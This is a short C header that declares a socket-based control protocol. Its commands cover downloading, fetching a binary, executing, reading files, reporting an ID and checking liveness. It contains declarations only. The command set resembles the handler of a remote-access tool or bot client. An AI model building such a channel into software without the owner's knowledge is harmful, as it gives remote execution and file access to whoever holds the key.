#pragma once
#include "util.h"

struct ControlProtocol
{
	char* ControlRequest;
	BOOL (*ControlFunction)( SOCKET *,char*,char* ); 
};

typedef struct ControlProtocol ControlProtocol;

#define ControlDownload 0
#define ControlGetBinary 1
#define ControlExec 2
#define ControlGetID 3
#define ControlCheckAlive 4
#define ControlReadFile 5

///
/// Number of control commands
///
#define ControlProtocolNum 6


#define ControlCmdDownload "/download"
#define ControlCmdGetBinary "/getBinary"
#define ControlCmdExec "/exec"
#define ControlCmdGetID "/getID"
#define ControlCmdCheckAlive "/checkAlive"
#define ControlCmdReadFile "/readFile"

extern BOOL Control(SOCKET *ConnectSocket,char* Key);

